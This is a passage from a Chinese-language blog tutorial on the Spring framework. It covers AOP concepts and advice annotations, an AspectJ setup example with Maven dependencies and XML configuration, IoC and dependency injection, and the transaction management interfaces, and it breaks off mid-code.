<li><strong>连接点（Joinpoint）</strong>：指能够被拦截的点，在spring中，这些点指的都是方法，因为spring只支持方法类型的连接点，相当于目标对象类中的所有方法（可以被切入的点）</li>
<li><strong>切入点（Pointcut）</strong>：指我们要对哪些连接点进行拦截和定义（已经切入的点）</li>
<li><strong>通知/增强（Advice）</strong>：指拦截到连接点之后要做的事情，也就是通知，可以分为前置通知，后置通知，异常通知，最终通知，环绕通知（切面要完成的功能）</li>
<li><strong>引介（Introduction）</strong>：引介是一种特殊的通知，在不修改类代码的情况下，Introduction可在运行期为类动态的添加一些方法和Field</li>
<li><strong>切面（Aspect）</strong>：切入点和通知（引介）的结点</li>
<li><strong>目标对象（Target）</strong>：代理的目标对象</li>
<li><strong>代理（Proxy）</strong>：一个类被AOP织入增强后，就产生一个结果代理类。</li>
<li><strong>织入（Weaving）</strong>：把增强的功能添加到目标对象来创建新的代理对象的过程，spring采用动态代理织入。</li>
</ul>
<h2 id="通知"><a href="#通知" class="headerlink" title="通知"></a>通知</h2><ol>
<li><code>JoinPoint</code>，是Spring提供的静态变量，通过<code>joinPoint</code>参数，可以获取目标对象的信息,如类名称,方法参数,方法名称等，该参数是可选的。</li>
<li><code>ProceedingJoinPoint</code>，通过该对象的<code>proceed()</code>方法来执行目标函数，<code>proceed()</code>的返回值就是环绕通知的返回值。同样的，<code>ProceedingJoinPoint</code>对象也是可以获取目标对象的信息,如类名称,方法参数,方法名称等等</li>
</ol>
<h3 id="前置通知"><a href="#前置通知" class="headerlink" title="前置通知"></a>前置通知</h3><blockquote>
<p>在目标方法之前调用</p>
</blockquote>
<p>前置通知<code>@Before</code>注解进行标注，并可直接传入切点表达式的值，该通知在目标函数执行前执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before(&quot;execution(...)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">(JoinPoint joinPoint)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="后置通知"><a href="#后置通知" class="headerlink" title="后置通知"></a>后置通知</h3><blockquote>
<p>在目标方法之后调用</p>
</blockquote>
<h4 id="AfterReturning"><a href="#AfterReturning" class="headerlink" title="@AfterReturning"></a>@AfterReturning</h4><p>如果<strong>出现异常就不调用</strong>，通过<code>@AfterReturning</code>注解进行标注，该函数在目标函数执行完成后执行，并可以获取到目标函数最终的返回值<code>returnVal</code>，当目标函数没有返回值时，<code>returnVal</code>将返回<code>null</code>，必须通过<code>returning = “returnVal”</code>注明参数的名称而且必须与通知函数的参数名称相同。请注意，在任何通知中这些参数都是可选的，需要使用时直接填写即可，不需要使用时，可以完成不用声明出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterReturning(value=&quot;execution(...)&quot;,returning = &quot;returnVal&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AfterReturning</span><span class="params">(JoinPoint joinPoint,Object returnVal)</span></span>&#123;</span><br><span class="line">   System.out.println(<span class="string">&quot;我是后置通知...returnVal=&quot;</span>+returnVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="After"><a href="#After" class="headerlink" title="@After"></a>@After</h4><p>无论是否出现异常都调用,通过<code>@After</code>调用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@After(&quot;execution(...)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;最终通知....&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="环绕通知"><a href="#环绕通知" class="headerlink" title="环绕通知"></a>环绕通知</h3><blockquote>
<p>在目标方法之前、之后调用。</p>
</blockquote>
<p>通过<code>@Around</code>调用，环绕通知既可以在目标方法前执行也可在目标方法之后执行，更重要的是<strong>环绕通知可以控制目标方法是否指向执行</strong>，但即使如此，应该尽量以最简单的方式满足需求，在仅需在目标方法前执行时，应该采用前置通知而非环绕通知。</p>
<p>如下第一个参数必须是<code>ProceedingJoinPoint</code>，通过该对象的<code>proceed()</code>方法来执行目标函数，<code>proceed()</code>的返回值就是环绕通知的返回值。同样的，<code>ProceedingJoinPoint</code>对象也是可以获取目标对象的信息,如类名称,方法参数,方法名称等等</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;execution(...)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">around</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;我是环绕通知前....&quot;</span>);</span><br><span class="line">    <span class="comment">//执行目标函数</span></span><br><span class="line">    Object obj= (Object) joinPoint.proceed();</span><br><span class="line">    System.out.println(<span class="string">&quot;我是环绕通知后....&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="异常通知"><a href="#异常通知" class="headerlink" title="异常通知"></a>异常通知</h3><blockquote>
<p>出现异常则通知</p>
</blockquote>
<p>通过<code>@AfterThrowing</code>调用，该通知只有在异常时才会被触发，并由<code>throwing</code>来声明一个接收异常信息的变量，同样异常通知也用于<code>Joinpoint</code>参数，需要时加上即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AfterThrowing(value=&quot;execution(....)&quot;,throwing = &quot;e&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterThrowable</span><span class="params">(Throwable e)</span></span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;出现异常:msg=&quot;</span>+e.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用AspectJ方式使用AOP"><a href="#使用AspectJ方式使用AOP" class="headerlink" title="使用AspectJ方式使用AOP"></a>使用AspectJ方式使用AOP</h2><p>AspectJ是一个AOP框架，它能够对java代码进行AOP编译（一般在编译期进行），让java代码具有<code>AspectJ</code>的AOP功能（当然需要特殊的编译器），AspectJ是目前实现AOP框架中最成熟，功能最丰富的语言，AspectJ与java程序完全兼容，几乎是无缝关联，其实AspectJ单独就是一门语言，它需要专门的编译器(<code>ajc</code>编译器)。</p>
<p>Spring采用<strong>动态代理</strong>技术的实现原理来构建Spring AOP的内部机制（动态织入），这是与AspectJ（<strong>静态织入</strong>）最根本的<strong>区别</strong>。Spring 只是使用了与 <code>AspectJ 5</code> 一样的注解，但仍然没有使用 <code>AspectJ</code> 的编译器，底层依是动态代理技术的实现，因此并不依赖于 AspectJ 的编译器。</p>
<p>依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-aop --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjrt --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjrt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>目标对象的接口和实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;保存用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>切面类（通知类）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransactionAdvice</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明一个切入点，方便后面的调用</span></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.xm.service.*.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pointcut</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//前置通知;</span></span><br><span class="line">    <span class="comment">// @Before(&quot;execution(* com.xm.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="meta">@Before(&quot;TransactionAdvice.pointcut()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;前置通知&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//后置通知</span></span><br><span class="line">    <span class="meta">@After(&quot;TransactionAdvice.pointcut()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;后置通知（无论是否出现异常）&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//后置通知</span></span><br><span class="line">    <span class="meta">@AfterReturning(&quot;TransactionAdvice.pointcut()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterReturning</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;后置通知（出现异常不调用)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//异常通知</span></span><br><span class="line">    <span class="meta">@AfterThrowing(&quot;TransactionAdvice.pointcut()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterException</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;异常通知&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//环绕通知</span></span><br><span class="line">    <span class="meta">@Around(&quot;TransactionAdvice.pointcut()&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">around</span><span class="params">(ProceedingJoinPoint point)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕：调用目标方法之前&quot;</span>);</span><br><span class="line">        Object proceed = point.proceed();</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕：调用目标方法之后&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> proceed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>spring配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.xm.spring.UserServiceImpl&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;myAspect&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.xm.spring.TransactionAdvice&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AopTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;application.xml&quot;</span>);</span><br><span class="line">        UserService userService = context.getBean(UserService.class);</span><br><span class="line">        userService.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Spring-AOP-和AspectJ-AOP-区别"><a href="#Spring-AOP-和AspectJ-AOP-区别" class="headerlink" title="Spring AOP 和AspectJ AOP 区别"></a>Spring AOP 和AspectJ AOP 区别</h3><ol>
<li><strong>Spring AOP 属于运行时增强，而AspectJ是编译时增强</strong>，Spring AOP 是基于代理（Proxying），而AspectJ基于字节码操作（Bytecode Manipulation）</li>
<li><code>Spring AOP</code> 已经集成了 <code>AspectJ</code> ，<code>AspectJ</code> 应该算的上是 Java 生态系统中最完整的 AOP 框架了。<code>AspectJ</code> 相比于 <code>Spring AOP</code> 功能更加强大，但是 Spring AOP 相对来说更简单，如果切面比较少，那么两者性能差异不大。但是，当切面太多的话，最好选择 <code>AspectJ</code> ，它比<code>Spring AOP</code> 快很多。</li>
</ol>
<h1 id="3-Spring-IOC概念"><a href="#3-Spring-IOC概念" class="headerlink" title="3. Spring IOC概念"></a>3. Spring IOC概念</h1><p>IOC即<code>Inversion of Control</code>，控制反转，软件系统在没有引入IOC容器之前，对象A依赖于对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。</p>
<p>软件系统在引入IOC容器之后，这种情形就完全改变了，由于IOC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要对象B的时候，IOC容器会主动创建一个对象B注入到对象A需要的地方。</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E6%9C%AA%E5%BC%95%E5%85%A5IOC.jpg" alt="未引入IOC容器"></p>
<p><img src="http://qiniu.xiaoming.net.cn/%E5%BC%95%E5%85%A5IOC.jpg" alt="引入OIC容器"></p>
<p>通过前后的对比，可以看出来：对象A获得依赖对象B的过程,由主动行为变为了被动行为，控制权颠倒过来了，这就是“控制反转”这个名称的由来。</p>
<p>IOC是一种设计思想，就是将原本在程序中手动创建对象的控制权，交由Spring框架来管理。IoC再其他语言也有，并非 Spirng 特有。 IoC 容器是 Spring 用来实现 IoC 的载体， IoC 容器实际上就是个<code>Map（key，value）</code>,<code>Map</code>中存放的是各种对象。</p>
<p>DI即<code>Dependency Injection</code>，是控制反转的一种实现方式。控制被反转之后，获得依赖对象的过程由自身管理变为了由IOC容器主动注入所谓依赖注入，就是由IOC容器在运行期间，动态地将某种依赖关系注入到对象之中。</p>
<p>所以，依赖注入(DI)和控制反转(IOC)是从不同的角度的描述的同一件事情，就是指通过引入IOC容器，利用依赖关系注入的方式，实现对象之间的解耦。</p>
<p>Spring IoC的初始化过程：</p>
<p><img src="https://camo.githubusercontent.com/faa0326fb04c227b78b8e640b7a75da76a612f1f/68747470733a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f323031392d372f537072696e67494f432545352538382539442545352541372538422545352538432539362545382542462538372545372541382538422e706e67" alt="SpringIOC初始化过程"></p>
<h1 id="4-Spring-事务管理"><a href="#4-Spring-事务管理" class="headerlink" title="4. Spring 事务管理"></a>4. Spring 事务管理</h1><p>Spring事务管理的接口有三个：</p>
<ul>
<li><code>PlatformTransactionManager</code>：平台事务管理器</li>
<li><code>TransactionDefinition</code>：事务定义信息（事务隔离级别、传播行为、超时、只读、回滚规则）</li>
<li><code>TransactionStatus</code>：事务运行状态</li>
</ul>
<h2 id="PlatformTransactionManager接口"><a href="#PlatformTransactionManager接口" class="headerlink" title="PlatformTransactionManager接口"></a>PlatformTransactionManager接口</h2><p>Spring并不直接管理事务，而是提供了多种事务管理器 ，他们将事务管理的职责委托给Hibernate或者JTA等持久化机制所提供的相关平台框架的事务来实现。 Spring事务管理器的接口是： <code>org.springframework.transaction.PlatformTransactionManager</code>，通过这个接口，Spring为各个平台如JDBC、Hibernate等都提供了对应的事务管理器，但是具体的实现就是各个平台自己的事情了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PlatformTransactionManager</span> <span class="keyword">extends</span> <span class="title">TransactionManager</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据指定的传播行为，返回当前活动的事务或创建一个新事务</span></span><br><span class="line">	<span class="function">TransactionStatus <span class="title">getTransaction</span><span class="params">(<span class="meta">@Nullable</span> TransactionDefinition definition)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> TransactionException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用事务目前的状态提交事务</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">commit</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对执行的事务进行回调</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">rollback</span><span class="params">(TransactionStatus status)</span> <span class="keyword">throws</span> TransactionException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="TransactionDefinition接口"><a href="#TransactionDefinition接口" class="headerlink" title="TransactionDefinition接口"></a>TransactionDefinition接口</h2><p>事务管理器接口<code>PlatformTransactionManager</code>通过<code>getTransaction(TransactionDefinition definition)</code>方法来得到一个事务，这个方法里面的参数是<code>TransactionDefinition</code>类，该类定义了一些基本的事务属性。</p>
<p>事务属性主要包含以下几个方面：</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E4%BA%8B%E5%8A%A1%E5%B1%9E%E6%80%A7" alt="事务属性"></p>
<p>接口内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TransactionDefinition</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//事务传播行为:</span></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 支持当前事务，如果不存在，就新建一个</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_REQUIRED = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 支持当前事务，如果不存在，就不使用事务</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_SUPPORTS = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 支持当前事务，如果不存在就抛出异常</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_MANDATORY = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 如果有事务存在，挂起当前事务，创建一个新的事务</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_REQUIRES_NEW = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 以非事务方式运行，如果有事务存在，挂起当前事务</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_NOT_SUPPORTED = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 以非事务方式运行，如果有事务存在，就抛出异常</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_NEVER = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 如果有事务存在，则嵌套事务执行</span></span><br><span class="line"><span class="comment">	 * 内嵌事务并不是一个独立的事务，它依赖于外部事务的存在，只有通过外部的事务提交，</span></span><br><span class="line"><span class="comment">	 * 才能引起内部事务的提交，嵌套的子事务不能单独提交。</span></span><br><span class="line"><span class="comment">	 * 一个事务中可以包括多个保存点，每一个嵌套子事务。</span></span><br><span class="line"><span class="comment">	 * 另外，外部事务的回滚也会导致嵌套子事务的回滚。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> PROPAGATION_NESTED = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//隔离级别: </span></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 使用数据库默认级别</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> ISOLATION_DEFAULT = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 未提交读</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> ISOLATION_READ_UNCOMMITTED = Connection.TRANSACTION_READ_UNCOMMITTED;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 提交读</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> ISOLATION_READ_COMMITTED = Connection.TRANSACTION_READ_COMMITTED;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 可重复读</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> ISOLATION_REPEATABLE_READ = Connection.TRANSACTION_REPEATABLE_READ;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 串行化</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> ISOLATION_SERIALIZABLE = Connection.TRANSACTION_SERIALIZABLE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 超时时间，-1为不超时，单位为秒</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> TIMEOUT_DEFAULT = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回传播方式</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">getPropagationBehavior</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回隔离级别,事务管理器根据它来控制另外一个事务可以看到本事务内的哪些数据</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span 